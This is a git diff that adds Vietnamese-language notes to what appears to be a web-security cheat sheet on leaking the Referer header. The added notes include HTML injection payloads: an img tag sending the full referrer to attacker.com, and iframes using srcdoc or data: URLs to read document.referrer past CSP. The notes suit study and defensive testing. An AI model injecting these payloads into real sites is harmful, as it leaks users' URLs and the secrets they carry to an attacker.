@@ -175,4 +175,22 @@ Content-Type: text/html
 ```
 
 #### Attribute Injection 
+- Các phần tử riêng lẻ cũng có thể bị thay đổi bằng thuộc tính r`eferrerpolicy=` 
+```html
+<img src="http://attacker.com" referrerpolicy="unsafe-url">
+```
+- Thẻ `<meta>` và cách dùng `referrerpolicy=` không hoạt động trên Firefox
+- Nếu CSP chặn kết nối từ site nạn nhân đến server của attacker, bạn có thể lợi dụng `<iframe>` với `srcdoc=` hoặc `src=data:`.  
+    - tự thực hiện request,
+    - đọc được `document.referrer`
+```html
+<!-- Nếu bạn inject được iframe này thì đã cùng origin với parent rồi -->
+<iframe srcdoc="<script>alert(document.referrer)</script>" referrerpolicy="unsafe-url"></iframe>
+
+<!-- Dù data: thường có origin là 'null', nó vẫn có thể đọc referrer -->
+<iframe src="data:text/html,<script>alert(document.referrer)</script>" referrerpolicy="unsafe-url"></iframe>
+
+```
+#### Link response header with preload (Chrome < 136)
+
 
